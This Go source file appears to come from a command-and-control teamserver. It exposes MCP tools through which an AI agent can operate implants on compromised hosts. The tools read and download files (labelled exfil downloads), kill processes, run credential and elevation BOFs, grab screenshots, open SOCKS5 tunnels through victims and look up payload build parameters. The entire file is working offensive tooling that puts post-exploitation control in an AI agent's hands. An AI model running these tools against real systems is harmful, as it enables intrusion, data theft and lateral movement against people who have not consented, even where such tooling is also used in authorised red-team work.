package connector

/* MCP 第二批 tools：文件/进程/BOF/下载/截图/命令树/载荷参数表/标签/删除/隧道。
 * 见 mcp.go 的头部说明（Streamable HTTP 无状态实现）。 */

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"strings"

	"github.com/gin-gonic/gin"
)

/* ── 注册进 mcpTools（mcp.go 调用） ─────────────────────────────────── */

func mcpToolsExtra() []mcpTool {
	return []mcpTool{
		{
			Name:  "file_list",
			Title: "List directory on host",
			Description: "List a directory on a host (queued like a console `ls`). Output arrives async in agent_tasks. Windows beacon: `C:\\` style paths; Linux: `/etc`. Use `.` for cwd.",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "agent_id", "string", "Host id", true)
				mcpProp(s, "path", "string", "Directory path (default .)", false)
				return mcpStr(s)
			}(),
		},
		{
			Name:  "file_read",
			Title: "Read file on host",
			Description: "Read a file's content on a host (console `cat`). Output (async, poll agent_tasks) is text; for binaries or >16MB use file_download.",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "agent_id", "string", "Host id", true)
				mcpProp(s, "path", "string", "File path on the host", true)
				return mcpStr(s)
			}(),
		},
		{
			Name:  "file_download",
			Title: "Download file from host",
			Description: "Queue a console `download` for a file. When finished it appears in downloads_list; fetch bytes with download_get (base64).",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "agent_id", "string", "Host id", true)
				mcpProp(s, "path", "string", "File path on the host", true)
				return mcpStr(s)
			}(),
		},
		{
			Name:  "process_list",
			Title: "List processes on host",
			Description: "Queue a process listing (console `ps`). Output arrives async in agent_tasks.",
			InputSchema: mcpPropOne("agent_id", "Host id"),
		},
		{
			Name:  "process_kill",
			Title: "Kill process on host",
			Description: "Kill a process by PID (console `kill <pid>`). Verify with process_list.",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "agent_id", "string", "Host id", true)
				mcpProp(s, "pid", "integer", "Process id", true)
				return mcpStr(s)
			}(),
		},
		{
			Name:  "bof_execute",
			Title: "Execute BOF on host",
			Description: "Run a BOF object on a host (console `execute bof <path> [args] [-a]`). Path is a server-side .o (find with bofs_hint); `-a` = async for long jobs. Output arrives in agent_tasks. Example: bof_execute(agent_id, '/opt/kit/SAL-BOF/_bin/whoami.x64.o')",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "agent_id", "string", "Host id", true)
				mcpProp(s, "bof_path", "string", "Server-side .o path", true)
				mcpProp(s, "args", "string", "Argument string appended verbatim (e.g. 'arg1 arg2 -a')", false)
				return mcpStr(s)
			}(),
		},
		{
			Name:  "bofs_hint",
			Title: "Where BOFs live",
			Description: "Hints for locating BOF objects: Extension-Kit suites live under Extension-Kit/<Suite>/_bin/*.o on the teamserver (e.g. SAL-BOF, Creds-BOF, PostEx-BOF); the linux agent's own BOFs are served by the web console BOF page. Returns guidance text.",
			InputSchema: mcpStr(map[string]any{}),
		},
		{
			Name:  "command_tree",
			Title: "Full command tree",
			Description: "Every command registered per agent/listener/OS (groups, args, examples). Use it to discover exact command names/parameters before agent_command. Extension-Kit commands with pre-hooks expand into `execute bof` — their examples are authoritative.",
			InputSchema: mcpStr(map[string]any{}),
		},
		{
			Name:  "build_schema",
			Title: "Payload build form",
			Description: "The declared build-parameter form for an agent+listener type — exact fields generate_payload's config accepts (e.g. arch/format/sleep for beacon, format/arch/reconn for linux). Empty {} means the agent has no declared form (use sensible defaults).",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "agent", "string", "Agent name (beacon/linux/gopher/macos/kharon)", true)
				mcpProp(s, "listener_type", "string", "Listener type (e.g. BeaconHTTP)", true)
				return mcpStr(s)
			}(),
		},
		{
			Name:  "downloads_list",
			Title: "List exfil downloads",
			Description: "Files queued via file_download / console download: id, agent, name, size, state.",
			InputSchema: mcpStr(map[string]any{}),
		},
		{
			Name:  "download_get",
			Title: "Fetch downloaded file",
			Description: "Fetch a completed download's bytes by file id (base64).",
			InputSchema: mcpPropOne("file_id", "Download file id"),
		},
		{
			Name:  "screenshots_list",
			Title: "List screenshots",
			Description: "Screenshots captured from Windows hosts (console screenshot_bof): id, agent, time, note.",
			InputSchema: mcpStr(map[string]any{}),
		},
		{
			Name:  "screenshot_get",
			Title: "Fetch screenshot",
			Description: "Fetch a screenshot PNG by id (base64).",
			InputSchema: mcpPropOne("screen_id", "Screenshot id"),
		},
		{
			Name:  "agent_set_tag",
			Title: "Tag a host",
			Description: "Set the tag/label of one host (empty string clears).",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "agent_id", "string", "Host id", true)
				mcpProp(s, "tag", "string", "Tag text (empty to clear)", true)
				return mcpStr(s)
			}(),
		},
		{
			Name:  "agent_remove",
			Title: "Remove host record",
			Description: "Delete a host session from the teamserver (console history goes too; a live implant re-registers on next check-in).",
			InputSchema: mcpPropOne("agent_id", "Host id"),
		},
		{
			Name:  "tunnels_list",
			Title: "List tunnels",
			Description: "SOCKS proxies and port forwards (teamserver side): type, listen/target, agent, state.",
			InputSchema: mcpStr(map[string]any{}),
		},
		{
			Name:  "tunnel_create_socks5",
			Title: "Open SOCKS5 proxy",
			Description: "Create a SOCKS5 proxy on the teamserver routed through a host. Optional user/pass auth.",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "agent_id", "string", "Host id", true)
				mcpProp(s, "listen_host", "string", "Bind address on teamserver (default 127.0.0.1)", false)
				mcpProp(s, "listen_port", "integer", "Bind port (required)", true)
				mcpProp(s, "username", "string", "Auth username (optional)", false)
				mcpProp(s, "password", "string", "Auth password (optional)", false)
				return mcpStr(s)
			}(),
		},
	}
}

// mcpPropOne — 单必填字符串参数的 schema 快捷写法。
func mcpPropOne(name, desc string) map[string]any {
	s := map[string]any{}
	mcpProp(s, name, "string", desc, true)
	return mcpStr(s)
}

/* ── 分发（mcp.go 的 mcpToolsCall 追加调用） ────────────────────────── */

func (tc *TsConnector) mcpToolsCallExtra(ctx *gin.Context, name string, args json.RawMessage, username string) (string, error, bool) {
	switch name {
	case "file_list":
		var p struct {
			AgentID string `json:"agent_id"`
			Path    string `json:"path"`
		}
		if e := mcpParseParams(args, &p); e != nil {
			return "", errors.New(e.Message), true
		}
		if p.Path == "" {
			p.Path = "."
		}
		// shell ls 会经 shell 解释器；console 原生 ls 走文件浏览通道不落 console。
		// MCP 没有 WS，走 raw 解析链（各 agent 的 ls 命令 console 输出齐全）。
		return tc.mcpQueueCommand(p.AgentID, username, "ls "+mcpQuoteArg(p.Path))

	case "file_read":
		var p struct {
			AgentID string `json:"agent_id"`
			Path    string `json:"path"`
		}
		if e := mcpParseParams(args, &p); e != nil {
			return "", errors.New(e.Message), true
		}
		if p.Path == "" {
			return "", errors.New("path is required"), true
		}
		return tc.mcpQueueCommand(p.AgentID, username, "cat "+mcpQuoteArg(p.Path))

	case "file_download":
		var p struct {
			AgentID string `json:"agent_id"`
			Path    string `json:"path"`
		}
		if e := mcpParseParams(args, &p); e != nil {
			return "", errors.New(e.Message), true
		}
		if p.Path == "" {
			return "", errors.New("path is required"), true
		}
		return tc.mcpQueueCommand(p.AgentID, username, "download "+mcpQuoteArg(p.Path), " — fetch bytes later with download_get")

	case "process_list":
		var p struct {
			AgentID string `json:"agent_id"`
		}
		if e := mcpParseParams(args, &p); e != nil {
			return "", errors.New(e.Message), true
		}
		return tc.mcpQueueCommand(p.AgentID, username, "ps")

	case "process_kill":
		var p struct {
			AgentID string `json:"agent_id"`
			Pid     int64  `json:"pid"`
		}
		if e := mcpParseParams(args, &p); e != nil {
			return "", errors.New(e.Message), true
		}
		if p.Pid == 0 {
			return "", errors.New("pid is required"), true
		}
		return tc.mcpQueueCommand(p.AgentID, username, "kill "+itoa64(p.Pid))

	case "bof_execute":
		var p struct {
			AgentID string `json:"agent_id"`
			BofPath string `json:"bof_path"`
			Args    string `json:"args"`
		}
		if e := mcpParseParams(args, &p); e != nil {
			return "", errors.New(e.Message), true
		}
		if p.AgentID == "" || p.BofPath == "" {
			return "", errors.New("agent_id and bof_path are required"), true
		}
		cmdline := "execute bof " + mcpQuoteArg(p.BofPath)
		if strings.TrimSpace(p.Args) != "" {
			cmdline += " " + strings.TrimSpace(p.Args)
		}
		return tc.mcpQueueCommand(p.AgentID, username, cmdline)

	case "bofs_hint":
		out, _ := json.MarshalIndent(map[string]string{
			"extension_kit": "Extension-Kit/<Suite>/_bin/<name>.<arch>.o on the teamserver (SAL-BOF, Creds-BOF, Elevation-BOF, PostEx-BOF, Process-BOF, ...)",
			"linux_agent":   "the linux agent's BOFs are listed/managed on the web console BOF page (/api/bofs/* routes served by the linux_agent plugin)",
			"arch_note":     ".x64.o for 64-bit hosts; some suites ship .x86.o",
			"tip":           "paths must exist server-side and be readable by the teamserver process",
		}, "", "  ")
		return string(out), nil, true

	case "command_tree":
		payload, err := tc.teamserver.TsAxScriptCommands()
		if err != nil {
			return "", errors.New("command tree: " + err.Error()), true
		}
		return payload, nil, true

	case "build_schema":
		var p struct {
			Agent        string `json:"agent"`
			ListenerType string `json:"listener_type"`
		}
		if e := mcpParseParams(args, &p); e != nil {
			return "", errors.New(e.Message), true
		}
		if p.Agent == "" || p.ListenerType == "" {
			return "", errors.New("agent and listener_type are required"), true
		}
		payload, err := tc.teamserver.TsAgentBuildSchema(p.Agent, p.ListenerType)
		if err != nil {
			return "", errors.New("build schema: " + err.Error()), true
		}
		return payload, nil, true

	case "downloads_list":
		payload, err := tc.teamserver.TsDownloadList()
		if err != nil {
			return "", errors.New("downloads: " + err.Error()), true
		}
		return payload, nil, true

	case "download_get":
		var p struct {
			FileID string `json:"file_id"`
		}
		if e := mcpParseParams(args, &p); e != nil {
			return "", errors.New(e.Message), true
		}
		if p.FileID == "" {
			return "", errors.New("file_id is required"), true
		}
		_, content, err := tc.teamserver.TsDownloadSync(p.FileID)
		if err != nil {
			return "", errors.New("download sync: " + err.Error()), true
		}
		out, _ := json.Marshal(map[string]string{"base64": base64.StdEncoding.EncodeToString(content)})
		return string(out), nil, true

	case "screenshots_list":
		payload, err := tc.teamserver.TsScreenshotList()
		if err != nil {
			return "", errors.New("screenshots: " + err.Error()), true
		}
		return payload, nil, true

	case "screenshot_get":
		var p struct {
			ScreenID string `json:"screen_id"`
		}
		if e := mcpParseParams(args, &p); e != nil {
			return "", errors.New(e.Message), true
		}
		if p.ScreenID == "" {
			return "", errors.New("screen_id is required"), true
		}
		img, err := tc.teamserver.TsScreenshotGetImage(p.ScreenID)
		if err != nil {
			return "", errors.New("screenshot: " + err.Error()), true
		}
		out, _ := json.Marshal(map[string]string{"mime": "image/png", "base64": base64.StdEncoding.EncodeToString(img)})
		return string(out), nil, true

	case "agent_set_tag":
		var p struct {
			AgentID string `json:"agent_id"`
			Tag     string `json:"tag"`
		}
		if e := mcpParseParams(args, &p); e != nil {
			return "", errors.New(e.Message), true
		}
		if p.AgentID == "" {
			return "", errors.New("agent_id is required"), true
		}
		tag := p.Tag
		update := struct {
			Tags *string `json:"tags"`
		}{Tags: &tag}
		if err := tc.teamserver.TsAgentUpdateDataPartial(p.AgentID, update); err != nil {
			return "", errors.New("set tag: " + err.Error()), true
		}
		return "tag updated", nil, true

	case "agent_remove":
		var p struct {
			AgentID string `json:"agent_id"`
		}
		if e := mcpParseParams(args, &p); e != nil {
			return "", errors.New(e.Message), true
		}
		if p.AgentID == "" {
			return "", errors.New("agent_id is required"), true
		}
		if err := tc.teamserver.TsAgentRemove(p.AgentID); err != nil {
			return "", errors.New("remove: " + err.Error()), true
		}
		return "removed " + p.AgentID, nil, true

	case "tunnels_list":
		payload, err := tc.teamserver.TsTunnelList()
		if err != nil {
			return "", errors.New("tunnels: " + err.Error()), true
		}
		return payload, nil, true

	case "tunnel_create_socks5":
		var p struct {
			AgentID   string `json:"agent_id"`
			ListenHst string `json:"listen_host"`
			ListenPrt int    `json:"listen_port"`
			Username  string `json:"username"`
			Password  string `json:"password"`
		}
		if e := mcpParseParams(args, &p); e != nil {
			return "", errors.New(e.Message), true
		}
		if p.AgentID == "" || p.ListenPrt == 0 {
			return "", errors.New("agent_id and listen_port are required"), true
		}
		if p.ListenHst == "" {
			p.ListenHst = "127.0.0.1"
		}
		useAuth := p.Username != ""
		msg, err := tc.teamserver.TsTunnelCreateSocks5(p.AgentID, "socks5 via "+p.AgentID, p.ListenHst, p.ListenPrt, useAuth, p.Username, p.Password)
		if err != nil {
			return "", errors.New("socks5: " + err.Error()), true
		}
		return msg, nil, true
	}
	return "", nil, false
}

/* ── 帮手 ─────────────────────────────────────────────────────────────── */

// mcpQueueCommand — agent 侧命令统一入口：存在性校验 + raw 解析链 + 应答话术。
func (tc *TsConnector) mcpQueueCommand(agentID, username, cmdline string, note ...string) (string, error, bool) {
	if agentID == "" {
		return "", errors.New("agent_id is required"), true
	}
	if !tc.teamserver.TsAgentIsExists(agentID) {
		return "", errors.New("agent not found: " + agentID), true
	}
	if err := tc.teamserver.TsAxScriptParseAndExecute(agentID, username, cmdline); err != nil {
		return "", errors.New("command rejected: " + err.Error()), true
	}
	resp := "queued on " + agentID + ": " + cmdline + " — poll agent_tasks for output"
	if len(note) > 0 {
		resp += note[0]
	}
	return resp, nil, true
}

// mcpQuoteArg — 空格路径加引号（cmdline 由 axscript 分词器解析）。
func mcpQuoteArg(s string) string {
	if strings.ContainsAny(s, " \t\"") {
		return "\"" + strings.ReplaceAll(s, "\"", "\\\"") + "\""
	}
	return s
}

func itoa64(n int64) string {
	if n == 0 {
		return "0"
	}
	neg := n < 0
	if neg {
		n = -n
	}
	var buf [24]byte
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	if neg {
		i--
		buf[i] = '-'
	}
	return string(buf[i:])
}
